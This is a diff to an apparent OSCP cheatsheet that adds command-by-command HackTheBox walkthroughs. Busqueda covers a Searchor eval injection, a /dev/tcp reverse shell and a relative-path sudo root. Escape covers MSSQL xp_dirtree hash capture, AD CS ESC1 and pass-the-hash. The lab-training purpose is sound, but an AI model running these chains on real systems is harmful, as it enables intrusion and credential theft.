@@ -1,11 +1,11 @@
 ---
 tags: [OSCP, Cheatsheet, Commands, Exam]
 status: Maintained
-last_audited: 2026-09-15
+last_audited: 2026-09-16
 ---
 
 <!-- Living document: update after every box, module, or runbook change. -->
-<!-- Last full vault audit: 2026-09-15. Sources: all maintained command appendices, RUNBOOK V2, exam runbooks, methodology, modern tooling, modules, and box evidence, including the Management OpenAM/GLPI/rdiff route, Cap IDOR/PCAP/capability route, and Grandpa IIS WebDAV/migration/MS14-058 route. -->
+<!-- Last full vault audit: 2026-09-16. Sources: all maintained command appendices, RUNBOOK V2, exam runbooks, methodology, modern tooling, modules, and box evidence, including the Management OpenAM/GLPI/rdiff route, Cap IDOR/PCAP/capability route, Grandpa IIS WebDAV/migration/MS14-058 route, Busqueda Searchor/Git/Docker/relative-sudo route, and Escape MSSQL/ADCS/PTH route. -->
 <!-- Use this as the speed sheet. Open the linked appendix or runbook when the branch needs explanation, caveats, or a longer procedure. -->
 
 # CTRL+F ANYTHING
@@ -3251,3 +3251,297 @@ find "$BoxDir/loot/rdiff-root" -maxdepth 3 -type f -printf '%p\n'
 ```
 
 The duplicate restriction is parser- and version-dependent. Confirm the exact sudo rule, preserve the stderr transcript, and read only the proof file required for the exercise. See [[OSCP/RUNBOOK V2/Linux - Rdiff-Backup Sudo Abuse|Linux - Rdiff-Backup Sudo Abuse]] and [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]].
+
+## 19. BUSQUEDA: SEARCHOR, GIT, DOCKER, AND RELATIVE SUDO
+
+Use the hostname-aware URL after adding the target name to `/etc/hosts`. Keep the application proof separate from the callback attempt.
+
+1. Save the application response:
+
+```bash
+curl -fsS "http://$FQDN:$WebPort/" -o "$BoxDir/loot/searchor-index.html"
+```
+
+2. Search the response for the application and input names:
+
+```bash
+grep -Ein 'searchor|version|engine|query|gitea|href|form' "$BoxDir/loot/searchor-index.html"
+```
+
+3. Prove Searchor Python evaluation with a harmless identity command:
+
+```bash
+boxset SearchorPayload "test'),__import__('os').popen('id').read()#"
+```
+
+4. Send the proof expression with URL encoding:
+
+```bash
+curl -fsS -G "http://$FQDN:$WebPort/" \
+  --data-urlencode "engine=Accuweather" \
+  --data-urlencode "query=$SearchorPayload" \
+  | tee "$BoxDir/loot/searchor-id-proof.txt"
+```
+
+5. Prepare a callback only after the response proves execution:
+
+```bash
+nc -lvnp "$Lport"
+```
+
+6. Send the callback through the same query boundary:
+
+```bash
+boxset Callback "bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
+boxset SearchorPayload "test'),__import__('os').system('$Callback')#"
+curl --max-time 10 -fsS -G "http://$FQDN:$WebPort/" \
+  --data-urlencode "engine=Accuweather" \
+  --data-urlencode "query=$SearchorPayload" >/dev/null
+```
+
+7. If a stable SSH route is available, validate the recovered account once:
+
+```bash
+ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no "$Username@$BoxIP"
+```
+
+8. Inspect the application Git remote without printing the credential into shared notes:
+
+```bash
+boxset GitRepo "/var/www/app"
+git -C "$GitRepo" remote -v
+sed -n '1,160p' "$GitRepo/.git/config" > "$BoxDir/loot/git-config.txt"
+chmod 600 "$BoxDir/loot/git-config.txt"
+```
+
+9. Confirm the exact sudo wrapper and its source:
+
+```bash
+sudo -n -l
+```
+
+```bash
+sed -n '1,260p' "$SudoScript"
+```
+
+10. List Docker containers and loopback services:
+
+```bash
+sudo /usr/bin/python3 "$SudoScript" docker-ps
+```
+
+```bash
+ss -lntp
+```
+
+11. Inspect an application container's environment to private loot:
+
+```bash
+boxset DockerFormat '{{json .Config.Env}}'
+sudo /usr/bin/python3 "$SudoScript" docker-inspect "$DockerFormat" "$ContainerName" \
+  > "$BoxDir/loot/$ContainerName-env.json"
+chmod 600 "$BoxDir/loot/$ContainerName-env.json"
+```
+
+12. Search the private environment output for candidate credentials:
+
+```bash
+grep -Ein 'user|username|pass|password|secret|token|database|admin' \
+  "$BoxDir/loot/$ContainerName-env.json"
+```
+
+13. Trace a relative helper before creating a proof-only file:
+
+```bash
+grep -nE 'full-checkup|arg_list|subprocess|cwd|chdir' "$SudoScript"
+```
+
+14. Create the controlled helper in the tested working directory:
+
+```bash
+printf '%s\n' '#!/bin/bash' 'id > /tmp/root-proof.txt' > "$HOME/full-checkup.sh"
+chmod 700 "$HOME/full-checkup.sh"
+```
+
+15. Invoke the sudo action from the directory the wrapper actually uses:
+
+```bash
+cd "$HOME"
+sudo /usr/bin/python3 "$SudoScript" full-checkup
+```
+
+16. Confirm the private root proof and remove only the helper created during the run:
+
+```bash
+cat /tmp/root-proof.txt
+rm -f "$HOME/full-checkup.sh" /tmp/root-proof.txt
+```
+
+**Gotchas:** Searchor's reflected output is the initial proof channel. `--data-urlencode` preserves the expression. A Git remote credential may work for Gitea but fail for SSH. `docker-inspect` requires the format and container arguments in the order implemented by the wrapper. A relative helper resolves from the process working directory unless the script changes it. Keep credentials, environment output, proof files, and flags in private loot.
+
+See [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]], [[OSCP/RUNBOOK V2/Linux - Docker Enumeration|Linux Docker Enumeration]], [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux Credential Search]], and [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux Sudo Check]].
+
+## 20. ESCAPE: SMB, MSSQL COERCION, AD CS ESC1, AND PTH
+
+Use this route when a Windows domain controller exposes anonymous SMB, MSSQL, and WinRM. Keep all credentials, captures, PFX files, hashes, and flags in private loot.
+
+1. Set the box variables.
+
+```bash
+boxset BoxName Escape
+boxset BoxIP $BoxIP
+boxset LocalIP $LocalIP
+boxset BoxDir /home/kali/Platforms/HackTheBox/Escape
+boxset Domain sequel.htb
+boxset FQDN dc.sequel.htb
+boxset MssqlPort 1433
+boxset WinRMPort 5985
+boxset Wordlist /usr/share/wordlists/rockyou.txt
+```
+
+2. Scan every TCP port, then identify the AD and database services.
+
+```bash
+sudo nmap -Pn -n -p- --min-rate 5000 \
+  -oA "$BoxDir/nmap/allports" "$BoxIP"
+```
+
+```bash
+boxset Ports "53,88,135,389,445,1433,5985,9389"
+sudo nmap -Pn -n -sC -sV -p "$Ports" \
+  -oA "$BoxDir/nmap/services" "$BoxIP"
+```
+
+3. Measure the domain-controller clock before Kerberos or Certipy.
+
+```bash
+ntpdig -p 1 "$BoxIP"
+```
+
+4. List anonymous SMB shares and retrieve the readable evidence.
+
+```bash
+smbclient -L "//$BoxIP" -N
+mkdir -p "$BoxDir/loot/smb-public"
+smbclient "//$BoxIP/Public" -N \
+  -c "lcd $BoxDir/loot/smb-public; recurse ON; prompt OFF; mget *"
+```
+
+5. Extract the PDF text privately.
+
+```bash
+boxset PdfFile "$BoxDir/loot/smb-public/SQL Server Procedures.pdf"
+pdftotext -layout "$PdfFile" "$BoxDir/loot/sql-procedures.txt"
+chmod 600 "$BoxDir/loot/sql-procedures.txt"
+```
+
+6. Connect with the SQL authentication credential from the PDF.
+
+```bash
+mssqlclient.py "$Domain/$PublicUser:$PublicPassword@$BoxIP" \
+  -port "$MssqlPort"
+```
+
+7. Check SQL privilege, then test the direct command path.
+
+```sql
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+EXEC master..xp_cmdshell 'whoami';
+```
+
+8. Start Responder and trigger outbound SMB authentication through `xp_dirtree`.
+
+```bash
+sudo responder -I tun0 -wv
+```
+
+```sql
+EXEC master..xp_dirtree '\\$LocalIP\share', 1, 1;
+```
+
+9. Save the Net-NTLMv2 response and crack it offline.
+
+```bash
+cp "$HOME/.responder/logs/SMB-$LocalIP.txt" \
+  "$BoxDir/loot/sql-svc-ntlmv2.txt"
+chmod 600 "$BoxDir/loot/sql-svc-ntlmv2.txt"
+john --wordlist="$Wordlist" "$BoxDir/loot/sql-svc-ntlmv2.txt" \
+  > "$BoxDir/loot/sql-svc-john.log"
+john --show "$BoxDir/loot/sql-svc-ntlmv2.txt" \
+  > "$BoxDir/loot/sql-svc-cracked.txt"
+chmod 600 "$BoxDir/loot/sql-svc-john.log" "$BoxDir/loot/sql-svc-cracked.txt"
+```
+
+10. Validate the cracked service account and open WinRM.
+
+```bash
+netexec winrm "$BoxIP" -u "$SQLUser" -p "$SQLPassword" -d "$Domain"
+evil-winrm -i "$BoxIP" -u "$SQLUser" -p "$SQLPassword"
+```
+
+11. Search alternate log paths and decode the SQL error-log backup.
+
+```powershell
+Get-ChildItem -Path C:\SQLServer,C:\ProgramData,C:\Users -Recurse -Force -ErrorAction SilentlyContinue -File |
+  Where-Object { $_.Name -match 'ERRORLOG|\.bak$|config|backup' } |
+  Select-Object FullName,Length,LastWriteTime
+Get-Content -LiteralPath 'C:\SQLServer\Logs\ERRORLOG.BAK' -Encoding Unicode
+```
+
+12. Save and inspect the log locally without printing the credential into shared notes.
+
+```bash
+file "$BoxDir/loot/ERRORLOG.BAK"
+iconv -f UTF-16LE -t UTF-8 "$BoxDir/loot/ERRORLOG.BAK" \
+  > "$BoxDir/loot/ERRORLOG.utf8.txt"
+grep -Ein 'logon failed|Ryan|username' "$BoxDir/loot/ERRORLOG.utf8.txt" \
+  > "$BoxDir/loot/ERRORLOG-relevant.txt"
+chmod 600 "$BoxDir/loot/ERRORLOG.utf8.txt" "$BoxDir/loot/ERRORLOG-relevant.txt"
+```
+
+13. Validate the recovered domain user and enumerate vulnerable certificate templates.
+
+```bash
+netexec winrm "$BoxIP" -u "$RyanUser" -p "$RyanPassword" -d "$Domain"
+certipy find -u "$RyanUser@$Domain" -p "$RyanPassword" \
+  -dc-ip "$BoxIP" -vulnerable -stdout \
+  > "$BoxDir/loot/certipy-vulnerable.txt"
+chmod 600 "$BoxDir/loot/certipy-vulnerable.txt"
+```
+
+14. Confirm ESC1 before requesting a certificate. Required evidence is subject control, client authentication, and enrollment access for the current user.
+
+```bash
+boxset Template UserAuthentication
+boxset CAName $CAName
+certipy req -u "$RyanUser@$Domain" -p "$RyanPassword" \
+  -dc-ip "$BoxIP" -ca "$CAName" -template "$Template" \
+  -upn "$AdminUser@$Domain" \
+  > "$BoxDir/loot/certipy-request.txt"
+```
+
+15. Authenticate the PFX with a scoped clock correction when necessary.
+
+```bash
+faketime -f "+8h" certipy auth \
+  -pfx "$BoxDir/loot/administrator.pfx" -dc-ip "$BoxIP" \
+  > "$BoxDir/loot/certipy-auth.txt"
+chmod 600 "$BoxDir/loot/certipy-request.txt" \
+  "$BoxDir/loot/certipy-auth.txt" "$BoxDir/loot/administrator.pfx"
+```
+
+16. Validate the returned Administrator hash and use pass-the-hash.
+
+```bash
+netexec smb "$BoxIP" -u "$AdminUser" -H "$AdminHash" -d "$Domain"
+evil-winrm -i "$BoxIP" -u "$AdminUser" -H "$AdminHash"
+```
+
+```powershell
+whoami
+hostname
+type 'C:\Users\Administrator\Desktop\root.txt'
+```
+
+See [[OSCP/BOXES/WRITE UPS/Windows/Escape|Escape]], [[OSCP/RUNBOOK V2/AD - Certificate Services ESC1|AD Certificate Services ESC1]], [[OSCP/RUNBOOK V2/AD - Clock Sync|AD Clock Sync]], and [[OSCP/RUNBOOK V2/AD - Pass the Hash|AD Pass the Hash]].
